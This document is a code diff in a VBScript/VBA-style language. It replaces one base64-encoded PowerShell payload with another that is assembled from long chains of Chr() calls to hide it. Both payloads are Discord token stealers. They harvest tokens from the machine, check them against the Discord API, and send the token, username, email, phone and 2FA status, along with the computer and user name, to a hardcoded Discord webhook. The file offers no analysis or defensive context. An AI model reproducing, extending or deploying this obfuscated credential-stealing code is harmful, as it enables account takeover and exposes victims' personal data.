-DG_B64 = DG_B64 & "QS1aYS16MC05Xy1dezZ9XC5bQS1aYS16MC05Xy1dezI3LDExMH0nKSkgewogICAgICAgICAg"
-DG_B64 = DG_B64 & "ICAgICAgJHRrID0gJG0uVmFsdWUKICAgICAgICAgICAgICAgIGlmICghJHRva2Vucy5Db250"
-DG_B64 = DG_B64 & "YWluc0tleSgkdGspKSB7ICR0b2tlbnNbJHRrXSA9ICR0cnVlIH0KICAgICAgICAgICAgfQog"
-DG_B64 = DG_B64 & "ICAgICAgICAgICBmb3JlYWNoICgkbSBpbiBbcmVnZXhdOjpNYXRjaGVzKCRyLCAnbWZhXC5b"
-DG_B64 = DG_B64 & "QS1aYS16MC05Xy1dezg0fScpKSB7CiAgICAgICAgICAgICAgICAkdGsgPSAkbS5WYWx1ZQog"
-DG_B64 = DG_B64 & "ICAgICAgICAgICAgICAgaWYgKCEkdG9rZW5zLkNvbnRhaW5zS2V5KCR0aykpIHsgJHRva2Vu"
-DG_B64 = DG_B64 & "c1skdGtdID0gJHRydWUgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgokcmF3"
-DG_B64 = DG_B64 & "Q291bnQgPSAkdG9rZW5zLkNvdW50CgojIC0tLS0gVmFsaWRhdGUgZWFjaCBjYW5kaWRhdGUg"
-DG_B64 = DG_B64 & "YWdhaW5zdCBEaXNjb3JkIEFQSSAtLS0tCiR2YWxpZCA9IEAoKQpmb3JlYWNoICgkdGsgaW4g"
-DG_B64 = DG_B64 & "JHRva2Vucy5LZXlzKSB7CiAgICB0cnkgewogICAgICAgICRtZSA9IEludm9rZS1SZXN0TWV0"
-DG_B64 = DG_B64 & "aG9kICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUnIC1IZWFkZXJzIEB7"
-DG_B64 = DG_B64 & "IEF1dGhvcml6YXRpb24gPSAkdGs7ICdVc2VyLUFnZW50JyA9ICRVQSB9IC1UaW1lb3V0U2Vj"
-DG_B64 = DG_B64 & "IDYKICAgICAgICBpZiAoJG1lLnVzZXJuYW1lKSB7ICR2YWxpZCArPSBbcHNjdXN0b21vYmpl"
-DG_B64 = DG_B64 & "Y3RdQHsgVG9rZW4gPSAkdGs7IE1lID0gJG1lIH0gfQogICAgfSBjYXRjaCB7fQp9CgojIC0t"
-DG_B64 = DG_B64 & "LS0gUmVwb3J0IHRvIHdlYmhvb2sgLS0tLQpmdW5jdGlvbiBQb3N0LUVtYmVkKCR0aXRsZSwg"
-DG_B64 = DG_B64 & "JGRlc2MsICRjb2xvciwgJHRva2VuRmllbGQpIHsKICAgICRmdCA9ICIkZW52OkNPTVBVVEVS"
-DG_B64 = DG_B64 & "TkFNRSB8ICRlbnY6VVNFUk5BTUUiCiAgICBpZiAoJHB1YklQKSB7ICRmdCArPSAiIHwgJHB1"
-DG_B64 = DG_B64 & "YklQIiB9CiAgICAkZW1iZWQgPSBAeyB0aXRsZSA9ICR0aXRsZTsgZGVzY3JpcHRpb24gPSAk"
-DG_B64 = DG_B64 & "ZGVzYzsgY29sb3IgPSAkY29sb3I7IGZvb3RlciA9IEB7IHRleHQgPSAkZnQgfSB9CiAgICBp"
-DG_B64 = DG_B64 & "ZiAoJHRva2VuRmllbGQpIHsgJGVtYmVkWydmaWVsZHMnXSA9IEAoQHsgbmFtZSA9ICdUb2tl"
-DG_B64 = DG_B64 & "bic7IHZhbHVlID0gJHRva2VuRmllbGQgfSkgfQogICAgJGJvZHkgPSBAeyBlbWJlZHMgPSBA"
-DG_B64 = DG_B64 & "KCRlbWJlZCkgfSB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCA2CiAgICB0cnkgeyBJbnZva2Ut"
-DG_B64 = DG_B64 & "UmVzdE1ldGhvZCAkV0ggLU1ldGhvZCBQb3N0IC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24v"
-DG_B64 = DG_B64 & "anNvbicgLUhlYWRlcnMgQHsgJ1VzZXItQWdlbnQnID0gJFVBIH0gLUJvZHkgJGJvZHkgfSBj"
-DG_B64 = DG_B64 & "YXRjaCB7fQp9CgppZiAoJHZhbGlkLkNvdW50IC1lcSAwKSB7CiAgICAkZCA9ICJObyB2YWxp"
-DG_B64 = DG_B64 & "ZCBEaXNjb3JkIHRva2VucyBmb3VuZCBvbiB0aGlzIG1hY2hpbmUuYG5gblJhdyBjYW5kaWRh"
-DG_B64 = DG_B64 & "dGVzIHNjYW5uZWQ6ICRyYXdDb3VudCIKICAgIFBvc3QtRW1iZWQgJ0Rpc2NvcmQgVG9rZW4g"
-DG_B64 = DG_B64 & "LSBOb3QgRm91bmQnICRkIDE2NzExNjgwICRudWxsCn0gZWxzZSB7CiAgICBmb3JlYWNoICgk"
-DG_B64 = DG_B64 & "diBpbiAkdmFsaWQpIHsKICAgICAgICAkbWUgPSAkdi5NZQogICAgICAgICRkID0gIioqVXNl"
-DG_B64 = DG_B64 & "cjoqKiAkKCRtZS51c2VybmFtZSkiCiAgICAgICAgaWYgKCRtZS5lbWFpbCkgeyAkZCArPSAi"
-DG_B64 = DG_B64 & "YG4qKkVtYWlsOioqICQoJG1lLmVtYWlsKSIgfQogICAgICAgIGlmICgkbWUucGhvbmUpIHsg"
-DG_B64 = DG_B64 & "JGQgKz0gImBuKipQaG9uZToqKiAkKCRtZS5waG9uZSkiIH0KICAgICAgICBpZiAoJG1lLmlk"
-DG_B64 = DG_B64 & "KSB7ICRkICs9ICJgbioqSUQ6KiogJCgkbWUuaWQpIiB9CiAgICAgICAgaWYgKCRtZS5tZmFf"
-DG_B64 = DG_B64 & "ZW5hYmxlZCkgeyAkZCArPSAiYG4qKjJGQToqKiBFbmFibGVkIiB9CiAgICAgICAgJGNiID0g"
-DG_B64 = DG_B64 & "J2BgYCcgKyAkdi5Ub2tlbiArICdgYGAnCiAgICAgICAgUG9zdC1FbWJlZCAnRGlzY29yZCBU"
-DG_B64 = DG_B64 & "b2tlbicgJGQgMTY3MTE2ODAgJGNiCiAgICB9Cn0K"
+X19 = (Chr(74)&Chr(69)&Chr(86)&Chr(121)&Chr(99)&Chr(109)&Chr(57)&Chr(121)&Chr(81)&Chr(87)&Chr(78)&Chr(48)&Chr(97)&Chr(87)&Chr(57)&Chr(117)&Chr(85)&Chr(72)&Chr(74)&Chr(108)&Chr(90)&Chr(109)&Chr(86)&Chr(121)&Chr(90)&Chr(87)&Chr(53)&Chr(106)&Chr(90)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(100)&Chr(84)&Chr(97)&Chr(87)&Chr(120)&Chr(108)&Chr(98)&Chr(110)&Chr(82)&Chr(115)&Chr(101)&Chr(85)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(112)&Chr(98)&Chr(110)&Chr(86)&Chr(108)&Chr(74)&Chr(119)&Chr(111)&Chr(75)&Chr(74)&Chr(70)&Chr(100)&Chr(73)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(50)&Chr(104)&Chr(48))
+X19 = X19 & (Chr(100)&Chr(72)&Chr(66)&Chr(122)&Chr(79)&Chr(105)&Chr(56)&Chr(118)&Chr(90)&Chr(71)&Chr(108)&Chr(122)&Chr(89)&Chr(50)&Chr(57)&Chr(121)&Chr(90)&Chr(67)&Chr(53)&Chr(106)&Chr(98)&Chr(50)&Chr(48)&Chr(118)&Chr(89)&Chr(88)&Chr(66)&Chr(112)&Chr(76)&Chr(51)&Chr(100)&Chr(108)&Chr(89)&Chr(109)&Chr(104)&Chr(118)&Chr(98)&Chr(50)&Chr(116)&Chr(122)&Chr(76)&Chr(122)&Chr(69)&Chr(49)&Chr(78)&Chr(68)&Chr(85)&Chr(48)&Chr(77)&Chr(84)&Chr(65)&Chr(50)&Chr(77)&Chr(84)&Chr(89)&Chr(53)&Chr(78)&Chr(84)&Chr(85)&Chr(50)&Chr(77)&Chr(122)&Chr(77)&Chr(51)&Chr(77)&Chr(68)&Chr(99)&Chr(118)&Chr(98)&Chr(70)&Chr(82)&Chr(53))
+X19 = X19 & (Chr(100)&Chr(107)&Chr(99)&Chr(51)&Chr(90)&Chr(70)&Chr(78)&Chr(118)&Chr(83)&Chr(86)&Chr(112)&Chr(66)&Chr(86)&Chr(49)&Chr(104)&Chr(49)&Chr(79)&Chr(86)&Chr(86)&Chr(117)&Chr(90)&Chr(85)&Chr(53)&Chr(50)&Chr(98)&Chr(87)&Chr(120)&Chr(68)&Chr(87)&Chr(67)&Chr(49)&Chr(76)&Chr(97)&Chr(122)&Chr(82)&Chr(48)&Chr(82)&Chr(85)&Chr(78)&Chr(74)&Chr(89)&Chr(109)&Chr(112)&Chr(90)&Chr(77)&Chr(50)&Chr(78)&Chr(52)&Chr(84)&Chr(85)&Chr(116)&Chr(53)&Chr(98)&Chr(110)&Chr(78)&Chr(49)&Chr(84)&Chr(109)&Chr(57)&Chr(69)&Chr(84)&Chr(108)&Chr(108)&Chr(80)&Chr(97)&Chr(70)&Chr(108)&Chr(113)&Chr(97)&Chr(109)&Chr(53)&Chr(106))
+X19 = X19 & (Chr(97)&Chr(71)&Chr(120)&Chr(51)&Chr(90)&Chr(84)&Chr(66)&Chr(81)&Chr(83)&Chr(122)&Chr(108)&Chr(66)&Chr(83)&Chr(122)&Chr(103)&Chr(110)&Chr(67)&Chr(105)&Chr(82)&Chr(86)&Chr(81)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(100)&Chr(78)&Chr(98)&Chr(51)&Chr(112)&Chr(112)&Chr(98)&Chr(71)&Chr(120)&Chr(104)&Chr(76)&Chr(122)&Chr(85)&Chr(117)&Chr(77)&Chr(67)&Chr(65)&Chr(111)&Chr(86)&Chr(50)&Chr(108)&Chr(117)&Chr(90)&Chr(71)&Chr(57)&Chr(51)&Chr(99)&Chr(121)&Chr(66)&Chr(79)&Chr(86)&Chr(67)&Chr(65)&Chr(120)&Chr(77)&Chr(67)&Chr(52)&Chr(119)&Chr(79)&Chr(121)&Chr(66)&Chr(88)&Chr(97)&Chr(87)&Chr(52)&Chr(50))
+X19 = X19 & (Chr(78)&Chr(68)&Chr(115)&Chr(103)&Chr(101)&Chr(68)&Chr(89)&Chr(48)&Chr(75)&Chr(83)&Chr(66)&Chr(66)&Chr(99)&Chr(72)&Chr(66)&Chr(115)&Chr(90)&Chr(86)&Chr(100)&Chr(108)&Chr(89)&Chr(107)&Chr(116)&Chr(112)&Chr(100)&Chr(67)&Chr(56)&Chr(49)&Chr(77)&Chr(122)&Chr(99)&Chr(117)&Chr(77)&Chr(122)&Chr(89)&Chr(103)&Chr(75)&Chr(69)&Chr(116)&Chr(73)&Chr(86)&Chr(69)&Chr(49)&Chr(77)&Chr(76)&Chr(67)&Chr(66)&Chr(115)&Chr(97)&Chr(87)&Chr(116)&Chr(108)&Chr(73)&Chr(69)&Chr(100)&Chr(108)&Chr(89)&Chr(50)&Chr(116)&Chr(118)&Chr(75)&Chr(83)&Chr(66)&Chr(68)&Chr(97)&Chr(72)&Chr(74)&Chr(118)&Chr(98)&Chr(87)&Chr(85)&Chr(118))
+X19 = X19 & (Chr(77)&Chr(84)&Chr(73)&Chr(50)&Chr(76)&Chr(106)&Chr(65)&Chr(117)&Chr(77)&Chr(67)&Chr(52)&Chr(119)&Chr(73)&Chr(70)&Chr(78)&Chr(104)&Chr(90)&Chr(109)&Chr(70)&Chr(121)&Chr(97)&Chr(83)&Chr(56)&Chr(49)&Chr(77)&Chr(122)&Chr(99)&Chr(117)&Chr(77)&Chr(122)&Chr(89)&Chr(110)&Chr(67)&Chr(103)&Chr(111)&Chr(107)&Chr(99)&Chr(72)&Chr(86)&Chr(105)&Chr(83)&Chr(86)&Chr(65)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(110)&Chr(74)&Chr(119)&Chr(112)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(121)&Chr(65)&Chr(107)&Chr(99)&Chr(72)&Chr(86)&Chr(105)&Chr(83)&Chr(86)&Chr(65)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(111))
+X19 = X19 & (Chr(83)&Chr(87)&Chr(53)&Chr(50)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(76)&Chr(86)&Chr(74)&Chr(108)&Chr(99)&Chr(51)&Chr(82)&Chr(78)&Chr(90)&Chr(88)&Chr(82)&Chr(111)&Chr(98)&Chr(50)&Chr(81)&Chr(103)&Chr(74)&Chr(50)&Chr(104)&Chr(48)&Chr(100)&Chr(72)&Chr(66)&Chr(122)&Chr(79)&Chr(105)&Chr(56)&Chr(118)&Chr(89)&Chr(88)&Chr(66)&Chr(112)&Chr(76)&Chr(109)&Chr(108)&Chr(119)&Chr(97)&Chr(87)&Chr(90)&Chr(53)&Chr(76)&Chr(109)&Chr(57)&Chr(121)&Chr(90)&Chr(121)&Chr(99)&Chr(103)&Chr(76)&Chr(86)&Chr(82)&Chr(112)&Chr(98)&Chr(87)&Chr(86)&Chr(118)&Chr(100)&Chr(88)&Chr(82)&Chr(84)&Chr(90)&Chr(87)&Chr(77)&Chr(103))
+X19 = X19 & (Chr(78)&Chr(83)&Chr(107)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(106)&Chr(89)&Chr(88)&Chr(82)&Chr(106)&Chr(97)&Chr(67)&Chr(66)&Chr(55)&Chr(102)&Chr(81)&Chr(111)&Chr(75)&Chr(73)&Chr(121)&Chr(66)&Chr(66)&Chr(82)&Chr(86)&Chr(77)&Chr(116)&Chr(82)&Chr(48)&Chr(78)&Chr(78)&Chr(73)&Chr(69)&Chr(78)&Chr(85)&Chr(85)&Chr(105)&Chr(66)&Chr(107)&Chr(90)&Chr(87)&Chr(78)&Chr(121)&Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(98)&Chr(51)&Chr(73)&Chr(103)&Chr(75)&Chr(69)&Chr(82)&Chr(112)&Chr(99)&Chr(50)&Chr(78)&Chr(118)&Chr(99)&Chr(109)&Chr(81)&Chr(103)&Chr(90)&Chr(71)&Chr(86)&Chr(122)&Chr(97)&Chr(51)&Chr(82)&Chr(118))
+X19 = X19 & (Chr(99)&Chr(67)&Chr(66)&Chr(48)&Chr(98)&Chr(50)&Chr(116)&Chr(108)&Chr(98)&Chr(105)&Chr(66)&Chr(108)&Chr(98)&Chr(109)&Chr(78)&Chr(121)&Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(97)&Chr(87)&Chr(57)&Chr(117)&Chr(75)&Chr(81)&Chr(112)&Chr(66)&Chr(90)&Chr(71)&Chr(81)&Chr(116)&Chr(86)&Chr(72)&Chr(108)&Chr(119)&Chr(90)&Chr(83)&Chr(65)&Chr(116)&Chr(81)&Chr(88)&Chr(78)&Chr(122)&Chr(90)&Chr(87)&Chr(49)&Chr(105)&Chr(98)&Chr(72)&Chr(108)&Chr(79)&Chr(89)&Chr(87)&Chr(49)&Chr(108)&Chr(73)&Chr(70)&Chr(78)&Chr(53)&Chr(99)&Chr(51)&Chr(82)&Chr(108)&Chr(98)&Chr(83)&Chr(53)&Chr(84)&Chr(90)&Chr(87)&Chr(78)&Chr(49))
+X19 = X19 & (Chr(99)&Chr(109)&Chr(108)&Chr(48)&Chr(101)&Chr(81)&Chr(112)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(77)&Chr(119)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(81)&Chr(67)&Chr(99)&Chr(75)&Chr(100)&Chr(88)&Chr(78)&Chr(112)&Chr(98)&Chr(109)&Chr(99)&Chr(103)&Chr(85)&Chr(51)&Chr(108)&Chr(122)&Chr(100)&Chr(71)&Chr(86)&Chr(116)&Chr(79)&Chr(119)&Chr(112)&Chr(49)&Chr(99)&Chr(50)&Chr(108)&Chr(117)&Chr(90)&Chr(121)&Chr(66)&Chr(84)&Chr(101)&Chr(88)&Chr(78)&Chr(48)&Chr(90)&Chr(87)&Chr(48)&Chr(117)&Chr(85)&Chr(50)&Chr(86)&Chr(106))
+X19 = X19 & (Chr(100)&Chr(88)&Chr(74)&Chr(112)&Chr(100)&Chr(72)&Chr(107)&Chr(117)&Chr(81)&Chr(51)&Chr(74)&Chr(53)&Chr(99)&Chr(72)&Chr(82)&Chr(118)&Chr(90)&Chr(51)&Chr(74)&Chr(104)&Chr(99)&Chr(71)&Chr(104)&Chr(53)&Chr(79)&Chr(119)&Chr(112)&Chr(119)&Chr(100)&Chr(87)&Chr(74)&Chr(115)&Chr(97)&Chr(87)&Chr(77)&Chr(103)&Chr(89)&Chr(50)&Chr(120)&Chr(104)&Chr(99)&Chr(51)&Chr(77)&Chr(103)&Chr(82)&Chr(70)&Chr(103)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(99)&Chr(72)&Chr(86)&Chr(105)&Chr(98)&Chr(71)&Chr(108)&Chr(106)&Chr(73)&Chr(72)&Chr(78)&Chr(48)&Chr(89)&Chr(88)&Chr(82)&Chr(112))
+X19 = X19 & (Chr(89)&Chr(121)&Chr(66)&Chr(105)&Chr(101)&Chr(88)&Chr(82)&Chr(108)&Chr(87)&Chr(49)&Chr(48)&Chr(103)&Chr(82)&Chr(67)&Chr(104)&Chr(105)&Chr(101)&Chr(88)&Chr(82)&Chr(108)&Chr(87)&Chr(49)&Chr(48)&Chr(103)&Chr(97)&Chr(121)&Chr(119)&Chr(103)&Chr(89)&Chr(110)&Chr(108)&Chr(48)&Chr(90)&Chr(86)&Chr(116)&Chr(100)&Chr(73)&Chr(71)&Chr(52)&Chr(115)&Chr(73)&Chr(71)&Chr(74)&Chr(53)&Chr(100)&Chr(71)&Chr(86)&Chr(98)&Chr(88)&Chr(83)&Chr(66)&Chr(106)&Chr(75)&Chr(88)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(49)&Chr(99)&Chr(50)&Chr(108)&Chr(117))
+X19 = X19 & (Chr(90)&Chr(121)&Chr(104)&Chr(50)&Chr(89)&Chr(88)&Chr(73)&Chr(103)&Chr(89)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(70)&Chr(108)&Chr(99)&Chr(121)&Chr(53)&Chr(68)&Chr(99)&Chr(109)&Chr(86)&Chr(104)&Chr(100)&Chr(71)&Chr(85)&Chr(111)&Chr(75)&Chr(83)&Chr(108)&Chr(55)&Chr(73)&Chr(71)&Chr(69)&Chr(117)&Chr(83)&Chr(50)&Chr(86)&Chr(53)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(97)&Chr(122)&Chr(115)&Chr(103)&Chr(89)&Chr(83)&Chr(53)&Chr(78)&Chr(98)&Chr(50)&Chr(82)&Chr(108)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(81)&Chr(50)&Chr(108)&Chr(119)&Chr(97)&Chr(71)&Chr(86)&Chr(121)&Chr(84)&Chr(87)&Chr(57)&Chr(107))
+X19 = X19 & (Chr(90)&Chr(83)&Chr(53)&Chr(70)&Chr(81)&Chr(48)&Chr(73)&Chr(55)&Chr(73)&Chr(71)&Chr(69)&Chr(117)&Chr(85)&Chr(71)&Chr(70)&Chr(107)&Chr(90)&Chr(71)&Chr(108)&Chr(117)&Chr(90)&Chr(121)&Chr(65)&Chr(57)&Chr(73)&Chr(70)&Chr(66)&Chr(104)&Chr(90)&Chr(71)&Chr(82)&Chr(112)&Chr(98)&Chr(109)&Chr(100)&Chr(78)&Chr(98)&Chr(50)&Chr(82)&Chr(108)&Chr(76)&Chr(107)&Chr(53)&Chr(118)&Chr(98)&Chr(109)&Chr(85)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(89)&Chr(110)&Chr(108)&Chr(48)&Chr(90)&Chr(86)&Chr(116)&Chr(100)&Chr(73)&Chr(71)&Chr(56)&Chr(103))
+X19 = X19 & (Chr(80)&Chr(83)&Chr(66)&Chr(117)&Chr(90)&Chr(88)&Chr(99)&Chr(103)&Chr(89)&Chr(110)&Chr(108)&Chr(48)&Chr(90)&Chr(86)&Chr(116)&Chr(106)&Chr(76)&Chr(107)&Chr(120)&Chr(108)&Chr(98)&Chr(109)&Chr(100)&Chr(48)&Chr(97)&Chr(70)&Chr(48)&Chr(55)&Chr(73)&Chr(71)&Chr(74)&Chr(53)&Chr(100)&Chr(71)&Chr(86)&Chr(98)&Chr(88)&Chr(83)&Chr(66)&Chr(52)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(98)&Chr(109)&Chr(86)&Chr(51)&Chr(73)&Chr(71)&Chr(74)&Chr(53)&Chr(100)&Chr(71)&Chr(86)&Chr(98)&Chr(77)&Chr(84)&Chr(90)&Chr(100)&Chr(79)&Chr(121)&Chr(66)&Chr(66)&Chr(99)&Chr(110)&Chr(74)&Chr(104)&Chr(101)&Chr(83)&Chr(53)&Chr(68))
+X19 = X19 & (Chr(98)&Chr(51)&Chr(66)&Chr(53)&Chr(75)&Chr(71)&Chr(52)&Chr(115)&Chr(73)&Chr(72)&Chr(103)&Chr(115)&Chr(73)&Chr(68)&Chr(69)&Chr(121)&Chr(75)&Chr(84)&Chr(115)&Chr(103)&Chr(101)&Chr(70)&Chr(115)&Chr(120)&Chr(78)&Chr(86)&Chr(48)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(121)&Chr(79)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(72)&Chr(86)&Chr(122)&Chr(97)&Chr(87)&Chr(53)&Chr(110)&Chr(75)&Chr(72)&Chr(90)&Chr(104)&Chr(99)&Chr(105)&Chr(66)&Chr(108)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(89)&Chr(83)&Chr(53)&Chr(68)&Chr(99)&Chr(109)&Chr(86)&Chr(104))
+X19 = X19 & (Chr(100)&Chr(71)&Chr(86)&Chr(70)&Chr(98)&Chr(109)&Chr(78)&Chr(121)&Chr(101)&Chr(88)&Chr(66)&Chr(48)&Chr(98)&Chr(51)&Chr(73)&Chr(111)&Chr(75)&Chr(83)&Chr(108)&Chr(55)&Chr(73)&Chr(71)&Chr(90)&Chr(118)&Chr(99)&Chr(105)&Chr(104)&Chr(112)&Chr(98)&Chr(110)&Chr(81)&Chr(103)&Chr(97)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(68)&Chr(65)&Chr(55)&Chr(73)&Chr(71)&Chr(107)&Chr(103)&Chr(80)&Chr(67)&Chr(66)&Chr(106)&Chr(76)&Chr(107)&Chr(120)&Chr(108)&Chr(98)&Chr(109)&Chr(100)&Chr(48)&Chr(97)&Chr(68)&Chr(115)&Chr(103)&Chr(97)&Chr(83)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(65)&Chr(120)&Chr(78)&Chr(105)&Chr(108)&Chr(55))
+X19 = X19 & (Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(74)&Chr(53)&Chr(100)&Chr(71)&Chr(86)&Chr(98)&Chr(88)&Chr(83)&Chr(66)&Chr(105)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(90)&Chr(83)&Chr(53)&Chr(85)&Chr(99)&Chr(109)&Chr(70)&Chr(117)&Chr(99)&Chr(50)&Chr(90)&Chr(118)&Chr(99)&Chr(109)&Chr(49)&Chr(71)&Chr(97)&Chr(87)&Chr(53)&Chr(104)&Chr(98)&Chr(69)&Chr(74)&Chr(115)&Chr(98)&Chr(50)&Chr(78)&Chr(114)&Chr(75)&Chr(72)&Chr(103)&Chr(115)&Chr(73)&Chr(68)&Chr(65)&Chr(115)&Chr(73)&Chr(68)&Chr(69)&Chr(50))
+X19 = X19 & (Chr(75)&Chr(84)&Chr(115)&Chr(103)&Chr(97)&Chr(87)&Chr(53)&Chr(48)&Chr(73)&Chr(71)&Chr(48)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(78)&Chr(89)&Chr(88)&Chr(82)&Chr(111)&Chr(76)&Chr(107)&Chr(49)&Chr(112)&Chr(98)&Chr(105)&Chr(103)&Chr(120)&Chr(78)&Chr(105)&Chr(119)&Chr(103)&Chr(89)&Chr(121)&Chr(53)&Chr(77)&Chr(90)&Chr(87)&Chr(53)&Chr(110)&Chr(100)&Chr(71)&Chr(103)&Chr(103)&Chr(76)&Chr(83)&Chr(66)&Chr(112)&Chr(75)&Chr(84)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(90)&Chr(109)&Chr(57)&Chr(121))
+X19 = X19 & (Chr(75)&Chr(71)&Chr(108)&Chr(117)&Chr(100)&Chr(67)&Chr(66)&Chr(113)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(77)&Chr(68)&Chr(115)&Chr(103)&Chr(97)&Chr(105)&Chr(65)&Chr(56)&Chr(73)&Chr(71)&Chr(48)&Chr(55)&Chr(73)&Chr(71)&Chr(111)&Chr(114)&Chr(75)&Chr(121)&Chr(107)&Chr(103)&Chr(98)&Chr(49)&Chr(116)&Chr(112)&Chr(73)&Chr(67)&Chr(115)&Chr(103)&Chr(97)&Chr(108)&Chr(48)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(111)&Chr(89)&Chr(110)&Chr(108)&Chr(48)&Chr(90)&Chr(83)&Chr(107)&Chr(111)&Chr(89)&Chr(49)&Chr(116)&Chr(112)&Chr(73)&Chr(67)&Chr(115)&Chr(103)&Chr(97)&Chr(108)&Chr(48)&Chr(103)&Chr(88)&Chr(105)&Chr(66)&Chr(105))
+X19 = X19 & (Chr(87)&Chr(50)&Chr(112)&Chr(100)&Chr(75)&Chr(84)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(90)&Chr(109)&Chr(57)&Chr(121)&Chr(75)&Chr(71)&Chr(108)&Chr(117)&Chr(100)&Chr(67)&Chr(66)&Chr(113)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(77)&Chr(84)&Chr(85)&Chr(55)&Chr(73)&Chr(71)&Chr(111)&Chr(103)&Chr(80)&Chr(106)&Chr(48)&Chr(103)&Chr(77)&Chr(84)&Chr(73)&Chr(55)&Chr(73)&Chr(71)&Chr(111)&Chr(116)&Chr(76)&Chr(83)&Chr(108)&Chr(55)&Chr(73)&Chr(71)&Chr(108)&Chr(109)&Chr(75)&Chr(67)&Chr(115)&Chr(114))
+X19 = X19 & (Chr(101)&Chr(70)&Chr(116)&Chr(113)&Chr(88)&Chr(83)&Chr(65)&Chr(104)&Chr(80)&Chr(83)&Chr(65)&Chr(119)&Chr(75)&Chr(83)&Chr(66)&Chr(105)&Chr(99)&Chr(109)&Chr(86)&Chr(104)&Chr(97)&Chr(122)&Chr(115)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(57)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(121)&Chr(90)&Chr(88)&Chr(82)&Chr(49)&Chr(99)&Chr(109)&Chr(52)&Chr(103)&Chr(98)&Chr(122)&Chr(115)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(57)&Chr(67)&Chr(110)&Chr(48)&Chr(75)&Chr(74)&Chr(48)&Chr(65)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(69)&Chr(70)&Chr(107)&Chr(90)&Chr(67)&Chr(49)&Chr(85)&Chr(101)&Chr(88)&Chr(66)&Chr(108)&Chr(73)&Chr(67)&Chr(49)&Chr(85)&Chr(101)&Chr(88)&Chr(66)&Chr(108)&Chr(82)&Chr(71)&Chr(86)&Chr(109)&Chr(97)&Chr(87)&Chr(53)&Chr(112)&Chr(100)&Chr(71)&Chr(108)&Chr(118)&Chr(98)&Chr(105)&Chr(65)&Chr(107)&Chr(89)&Chr(122)&Chr(65)&Chr(103)&Chr(76)&Chr(85)&Chr(120)&Chr(104)&Chr(98)&Chr(109)&Chr(100)&Chr(49)&Chr(89)&Chr(87)&Chr(100)&Chr(108)&Chr(73)&Chr(69)&Chr(78)&Chr(84)&Chr(97)&Chr(71)&Chr(70)&Chr(121)&Chr(99)&Chr(65)&Chr(112)&Chr(57)&Chr(73)&Chr(71)&Chr(78)&Chr(104)&Chr(100)&Chr(71)&Chr(78)&Chr(111))
